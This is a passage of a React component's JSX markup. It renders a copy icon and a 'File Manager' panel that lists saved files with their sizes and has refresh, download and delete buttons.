                      <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l3 3 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    ) : (
                      <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5"/><path d="M3 11V3h8" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
                    )}
                  </button>
                </div>
              )}
            </div>
            <div className="glass-card section-enter" style={{ flex: 2, marginBottom: 0 }}>
              <div className="header" style={{ padding: 0, marginBottom: 16 }}>
                <h2>File Manager</h2>
                <button className="btn btn-secondary" style={{ padding: '4px 10px', fontSize: 11, width: 'auto' }}
                  onClick={fetchFiles} disabled={filesLoading}>
                  {filesLoading ? 'Loading...' : 'Refresh'}
                </button>
              </div>
              <div className="file-list">
                {files.length === 0 ? (
                  <div className="file-empty">No saved files</div>
                ) : (
                  files.map(f => (
                    <div key={f.name} className="file-row">
                      <span className="file-name" title={f.name}>{f.name}</span>
                      <span className="file-size">{f.size > 1024 ? (f.size / 1024).toFixed(1) + ' KB' : f.size + ' B'}</span>
                      <button className="file-btn" onClick={() => handleDownloadFile(f.name)} title="Download">
                        <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><path d="M8 2v8M4 7l4 4 4-4M2 13h12" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                      </button>
                      <button className="file-btn file-btn-del" onClick={() => handleDeleteFile(f.name)} title="Delete">
                        <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><path d="M3 5h10M6 5V3h4v2M5 5v8h6V5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                      </button>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
          )}
        </div>
      </div>
    </div>
  )
}
